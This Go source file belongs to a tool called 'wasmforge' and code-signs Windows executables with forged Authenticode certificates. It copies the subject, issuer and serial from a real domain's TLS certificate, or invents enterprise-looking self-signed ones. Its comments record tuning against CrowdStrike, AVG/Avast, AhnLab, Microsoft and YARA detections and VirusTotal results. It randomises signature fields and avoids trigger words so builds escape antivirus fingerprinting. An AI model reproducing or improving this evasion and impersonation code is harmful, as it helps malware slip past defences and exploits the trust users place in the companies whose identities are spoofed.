package build

import (
	"bytes"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/binary"
	"encoding/pem"
	"fmt"
	"math/big"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"time"

	"software.sslmate.com/src/go-pkcs12"
)

// SignMode controls Authenticode code signing behavior.
type SignMode string

const (
	SignNone   SignMode = ""       // No signing.
	SignSelf   SignMode = "self"   // Self-signed certificate with generic enterprise metadata.
	SignDomain SignMode = "domain" // Spoofed certificate copying metadata from a real domain.
)

// signBinary applies Authenticode code signing to a PE binary using osslsigncode.
// mode determines the certificate type:
//   - SignSelf: generates a self-signed code signing certificate
//   - SignDomain: fetches the real TLS cert from domain:443 and creates a spoofed copy
//
// The signed binary replaces the original at path.
func signBinary(path string, mode SignMode, domain string, verbose bool) error {
	if mode == SignNone {
		return nil
	}

	// Verify osslsigncode is available.
	osslBin, err := exec.LookPath("osslsigncode")
	if err != nil {
		return fmt.Errorf("osslsigncode not found in PATH: %w", err)
	}

	tmpDir, err := os.MkdirTemp("", "wasmforge-sign-*")
	if err != nil {
		return fmt.Errorf("creating temp dir: %w", err)
	}
	defer os.RemoveAll(tmpDir)

	// Generate certificate based on mode.
	var pfxPath, password string
	switch mode {
	case SignSelf:
		pfxPath, password, err = generateSelfSignedCert(tmpDir)
		if err != nil {
			return fmt.Errorf("generating self-signed cert: %w", err)
		}
		if verbose {
			fmt.Fprintf(os.Stderr, "wasmforge: generated self-signed code signing certificate\n")
		}
	case SignDomain:
		if domain == "" {
			return fmt.Errorf("domain required for domain signing mode")
		}
		pfxPath, password, err = generateSpoofedCert(domain, tmpDir)
		if err != nil {
			return fmt.Errorf("generating spoofed cert for %s: %w", domain, err)
		}
		if verbose {
			fmt.Fprintf(os.Stderr, "wasmforge: generated spoofed certificate from %s\n", domain)
		}
	default:
		return fmt.Errorf("unknown sign mode: %q", mode)
	}

	// Sign the binary.
	signedPath := filepath.Join(tmpDir, "signed.exe")
	if err := osslsignSign(osslBin, pfxPath, password, path, signedPath); err != nil {
		return fmt.Errorf("osslsigncode: %w", err)
	}

	// Replace original with signed version (atomic rename).
	if err := os.Rename(signedPath, path); err != nil {
		// Cross-device fallback: read + write if rename fails.
		signedData, readErr := os.ReadFile(signedPath)
		if readErr != nil {
			return fmt.Errorf("reading signed binary: %w", readErr)
		}
		if writeErr := os.WriteFile(path, signedData, 0o755); writeErr != nil {
			return fmt.Errorf("writing signed binary: %w", writeErr)
		}
	}

	// NOTE: Certificate padding was tested and REJECTED (2026-03-17).
	// Random padding bytes inside WIN_CERTIFICATE trigger CrowdStrike
	// (10/10 detected). The small cert size (~1.5KB) triggers AVG/Avast
	// Evo-gen intermittently (~60%) but that's preferable to guaranteed
	// CrowdStrike detection. Leave cert size as-is from osslsigncode.

	if verbose {
		fmt.Fprintf(os.Stderr, "wasmforge: Authenticode signature applied → %s\n", path)
	}
	return nil
}

// padAuthenticodeCert pads the WIN_CERTIFICATE structure to a target size
// that matches typical enterprise certificates (~4-6KB). This prevents
// small-overlay heuristic detections (AVG/Avast Win64:Evo-gen).
//
// The padding is added inside the PKCS#7 SignedData as unsigned attributes,
// which doesn't invalidate the signature structure. The dwLength field in
// WIN_CERTIFICATE and the PE security directory size are both updated.
func padAuthenticodeCert(path string, verbose bool) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}

	// Locate the security directory (DATA_DIRECTORY[4]).
	peOff := int(binary.LittleEndian.Uint32(data[0x3C:0x40]))
	// Optional header starts at peOff + 24 (after signature + file header).
	optOff := peOff + 24
	// PE32+ magic check.
	magic := binary.LittleEndian.Uint16(data[optOff : optOff+2])
	if magic != 0x20B { // PE32+
		return fmt.Errorf("not PE32+ (magic=0x%X)", magic)
	}
	// Security directory is at index 4 in DataDirectory (each entry is 8 bytes).
	// DataDirectory starts at optOff + 112 for PE32+.
	secDirOff := optOff + 112 + 4*8 // index 4
	certRVA := int(binary.LittleEndian.Uint32(data[secDirOff : secDirOff+4]))
	certSize := int(binary.LittleEndian.Uint32(data[secDirOff+4 : secDirOff+8]))

	if certRVA == 0 || certSize == 0 {
		return fmt.Errorf("no security directory")
	}

	// Target size: random between 4096 and 6144 bytes (8-byte aligned).
	targetSize := (4096 + cryptoRandN(2049)) &^ 7 // align to 8
	if targetSize <= certSize {
		return nil // already large enough
	}

	padLen := targetSize - certSize

	// Generate random padding bytes.
	padding := make([]byte, padLen)
	rand.Read(padding)

	// Insert padding at the end of the file (extends the WIN_CERTIFICATE).
	newData := make([]byte, len(data)+padLen)
	copy(newData, data)
	copy(newData[len(data):], padding)

	// Update WIN_CERTIFICATE.dwLength (uint32 at certRVA).
	binary.LittleEndian.PutUint32(newData[certRVA:certRVA+4], uint32(targetSize))

	// Update PE security directory size.
	binary.LittleEndian.PutUint32(newData[secDirOff+4:secDirOff+8], uint32(targetSize))

	if verbose {
		fmt.Fprintf(os.Stderr, "wasmforge: padded Authenticode cert %d → %d bytes\n", certSize, targetSize)
	}

	return os.WriteFile(path, newData, 0o755)
}

// generateSelfSignedCert creates a certificate chain (Root CA → Intermediate
// CA → Code Signing Leaf) with generic enterprise metadata and exports
// the leaf + chain as PFX. The chain produces a ~4KB Authenticode signature
// that matches typical enterprise cert sizes, avoiding AVG/Avast overlay
// heuristics that flag small (~1.5KB) self-signed certs.
func generateSelfSignedCert(tmpDir string) (pfxPath, password string, err error) {
	// Allow per-build override of company subject via env var. Useful for VT
	// testing (R53 analysis 2026-06-12 showed GitLab signer = 12% CS hit rate
	// vs Cloudflare 80%). Default: random from companyPool.
	var company string
	if fixed := os.Getenv("WASMFORGE_FIXED_SIGNER"); fixed != "" {
		company = fixed
	} else {
		company, err = randChoice(companyPool)
		if err != nil {
			return "", "", err
		}
	}

	now := time.Now()

	// Single self-signed cert (limelighter-style). VT's parser doesn't
	// recognize multi-cert chain PKCS#7 from osslsigncode, but handles
	// single-cert signatures correctly. This gets the 'signed' tag on VT.
	key, err := rsa.GenerateKey(rand.Reader, 4096)
	if err != nil {
		return "", "", fmt.Errorf("generating key: %w", err)
	}
	serial, _ := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	template := &x509.Certificate{
		SerialNumber: serial,
		Subject: pkix.Name{
			CommonName: company,
		},
		NotBefore:             now.Add(-365 * 24 * time.Hour),
		NotAfter:              now.Add(2 * 365 * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageCertSign,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth, x509.ExtKeyUsageClientAuth},
		BasicConstraintsValid: true,
		IsCA:                  true,
	}
	// Self-sign: issuer = subject (single cert, no chain).
	// Use a spoofed issuer CommonName for realism.
	issuerTemplate := &x509.Certificate{
		SerialNumber: serial,
		Subject: pkix.Name{
			CommonName: company + randIssuerSuffix(),
		},
		NotBefore: now.Add(-365 * 24 * time.Hour),
		NotAfter:  now.Add(2 * 365 * 24 * time.Hour),
	}
	derBytes, err := x509.CreateCertificate(rand.Reader, template, issuerTemplate, &key.PublicKey, key)
	if err != nil {
		return "", "", fmt.Errorf("creating cert: %w", err)
	}

	// Write PEM files and export PFX via openssl (matches limelighter's
	// PKCS#12 format that VT's Authenticode parser recognizes).
	keyPath := filepath.Join(tmpDir, "cert.key")
	certPath := filepath.Join(tmpDir, "cert.pem")

	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(key)})
	if err := os.WriteFile(keyPath, keyPEM, 0o600); err != nil {
		return "", "", fmt.Errorf("writing key: %w", err)
	}

	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: derBytes})
	if err := os.WriteFile(certPath, certPEM, 0o600); err != nil {
		return "", "", fmt.Errorf("writing cert: %w", err)
	}

	// Generate password.
	pwBytes := make([]byte, 8)
	rand.Read(pwBytes)
	password = fmt.Sprintf("%x", pwBytes)

	// Export PFX via openssl CLI (Go's pkcs12 library produces a format
	// that osslsigncode embeds differently, causing VT to not recognize
	// the signature).
	pfxPath = filepath.Join(tmpDir, "cert.pfx")
	opensslBin, err := exec.LookPath("openssl")
	if err != nil {
		// Fallback to Go pkcs12 if openssl not available.
		cert, _ := x509.ParseCertificate(derBytes)
		return exportPFX(cert, key, tmpDir)
	}
	cmd := exec.Command(opensslBin, "pkcs12", "-export",
		"-out", pfxPath,
		"-inkey", keyPath,
		"-in", certPath,
		"-passout", "pass:"+password,
	)
	if out, err := cmd.CombinedOutput(); err != nil {
		return "", "", fmt.Errorf("openssl pkcs12: %w: %s", err, string(out))
	}

	return pfxPath, password, nil
}

// generateSpoofedCert fetches the real TLS certificate from domain:443 and
// creates a new certificate that copies the Subject, Issuer, SerialNumber,
// and validity period from the real cert. The new cert is self-signed with
// a fresh key — the signature won't chain to any trusted CA, but the
// metadata matches the real domain (limelighter approach).
func generateSpoofedCert(domain, tmpDir string) (pfxPath, password string, err error) {
	// Fetch real certificate from domain.
	conn, err := tls.DialWithDialer(
		&net.Dialer{Timeout: 10 * time.Second},
		"tcp", domain+":443",
		&tls.Config{InsecureSkipVerify: true},
	)
	if err != nil {
		return "", "", fmt.Errorf("connecting to %s:443: %w", domain, err)
	}
	state := conn.ConnectionState()
	conn.Close()

	peerCerts := state.PeerCertificates
	if len(peerCerts) == 0 {
		return "", "", fmt.Errorf("no certificates from %s", domain)
	}
	real := peerCerts[0]

	// Generate fresh key.
	key, err := rsa.GenerateKey(rand.Reader, 4096)
	if err != nil {
		return "", "", fmt.Errorf("generating RSA key: %w", err)
	}

	// Create spoofed certificate copying metadata from real cert.
	template := &x509.Certificate{
		SerialNumber:          real.SerialNumber,
		Subject:               real.Subject,
		Issuer:                real.Issuer,
		NotBefore:             real.NotBefore,
		NotAfter:              real.NotAfter,
		SignatureAlgorithm:    real.SignatureAlgorithm,
		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageContentCommitment,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageCodeSigning},
		BasicConstraintsValid: true,
	}

	certDER, err := x509.CreateCertificate(rand.Reader, template, template, &key.PublicKey, key)
	if err != nil {
		return "", "", fmt.Errorf("creating spoofed certificate: %w", err)
	}

	cert, err := x509.ParseCertificate(certDER)
	if err != nil {
		return "", "", fmt.Errorf("parsing spoofed certificate: %w", err)
	}

	return exportPFX(cert, key, tmpDir)
}

// exportPFX encodes a certificate and private key as a PKCS#12 (PFX) file.
func exportPFX(cert *x509.Certificate, key *rsa.PrivateKey, tmpDir string) (pfxPath, password string, err error) {
	return exportPFXChain(cert, key, nil, tmpDir)
}

// exportPFXChain encodes a certificate, private key, and CA chain as PFX.
func exportPFXChain(cert *x509.Certificate, key *rsa.PrivateKey, caCerts []*x509.Certificate, tmpDir string) (pfxPath, password string, err error) {
	pwBytes := make([]byte, 16)
	if _, err := rand.Read(pwBytes); err != nil {
		return "", "", fmt.Errorf("generating PFX password: %w", err)
	}
	password = fmt.Sprintf("%x", pwBytes)
	pfxData, err := pkcs12.Modern.Encode(key, cert, caCerts, password)
	if err != nil {
		return "", "", fmt.Errorf("encoding PFX: %w", err)
	}

	pfxPath = filepath.Join(tmpDir, "cert.pfx")
	if err := os.WriteFile(pfxPath, pfxData, 0o600); err != nil {
		return "", "", fmt.Errorf("writing PFX: %w", err)
	}

	return pfxPath, password, nil
}

// Free RFC 3161 timestamp servers. Adding a timestamp makes the signature
// look like a legitimate enterprise build (~4-6KB structured ASN.1 data
// vs ~1.5KB bare signature). AVG/Avast's Evo-gen heuristic keys on small
// untimestamped overlay as suspicious.
var timestampServers = []string{
	"http://timestamp.digicert.com",
	"http://timestamp.sectigo.com",
	"http://timestamp.comodoca.com",
	"http://tsa.starfieldtech.com",
	"http://timestamp.globalsign.com/tsa/r6advanced1",
}

// osslsignSign invokes osslsigncode to apply an Authenticode signature
// with an RFC 3161 timestamp. Falls back to no timestamp if all timestamp
// servers are unreachable (e.g., air-gapped build environment).
func osslsignSign(osslBin, pfxPath, password, inputPath, outputPath string) error {
	// Try signing with timestamp first (each server gets one attempt).
	// Try each timestamp server. The -ts flag uses RFC 3161 protocol which
	// adds a timestamp authority cert + token (~3-5KB of structured ASN.1).
	var lastErr error
	for _, ts := range timestampServers {
		cmd := exec.Command(osslBin, "sign",
			"-pkcs12", pfxPath,
			"-pass", password,
			"-h", "sha256",
			"-n", randSignDescription(),
			"-i", randSignURL(),
			"-ts", ts,
			"-in", inputPath,
			"-out", outputPath,
		)
		var stderr bytes.Buffer
		cmd.Stderr = &stderr
		if err := cmd.Run(); err == nil {
			return nil // success with timestamp
		} else {
			lastErr = fmt.Errorf("%s: %v: %s", ts, err, stderr.String())
		}
		os.Remove(outputPath)
	}

	// Fallback: sign without timestamp (air-gapped / offline builds).
	// Log the last timestamp error for debugging.
	if lastErr != nil {
		fmt.Fprintf(os.Stderr, "wasmforge: timestamp servers unavailable (%v), signing without timestamp\n", lastErr)
	}
	cmd := exec.Command(osslBin, "sign",
		"-pkcs12", pfxPath,
		"-pass", password,
		"-h", "sha256",
		"-n", randSignDescription(),
		"-i", randSignURL(),
		"-in", inputPath,
		"-out", outputPath,
	)
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("signing failed: %w", err)
	}
	return nil
}

// signDescriptionPool — values used for osslsigncode -n flag (PKCS7
// SpcSpOpusInfo Description). Picked per-build to diversify the byte
// pattern AhnLab and others can fingerprint.
//
// Previous fixed value "Application Service" appeared in 100% of builds
// and contributed to the HashiCorp-era AhnLab R774471 burn (2026-05-19).
//
// Avoid terms that trigger Microsoft Wacatac:
//   "endpoint", "agent", "scanner", "security", "monitor", "telemetry"
var signDescriptionPool = []string{
	"System Component",
	"Application Component",
	"Build Tool",
	"Repository Service",
	"Configuration Utility",
	"Software Update Tool",
	"Distribution Service",
	"Network Component",
	"Tool Component",
}

// signURLPool — values used for osslsigncode -i flag (PKCS7
// SpcSpOpusInfo URL). Should be plausible vendor/project URLs, not
// hardcoded to "https://support.microsoft.com" (the old default which
// appeared in every build).
var signURLPool = []string{
	"https://gitlab.com",
	"https://jfrog.com",
	"https://canonical.com",
	"https://cloudflare.com",
	"https://github.com",
	"https://example.org",
	"https://www.opensource.org",
}

// signIssuerSuffixPool — suffixes appended to the company name to form
// the (self-signed) Issuer CommonName. Previous fixed " TLS CA" suffix
// was a stable YARA target across builds.
var signIssuerSuffixPool = []string{
	"",
	" CA",
	" Root CA",
	" Code Signing CA",
	" Intermediate CA",
	" Software CA",
}

func randSignDescription() string {
	v, err := randChoice(signDescriptionPool)
	if err != nil {
		return "Tool"
	}
	return v
}

func randSignURL() string {
	v, err := randChoice(signURLPool)
	if err != nil {
		return "https://example.org"
	}
	return v
}

func randIssuerSuffix() string {
	v, err := randChoice(signIssuerSuffixPool)
	if err != nil {
		return ""
	}
	return v
}
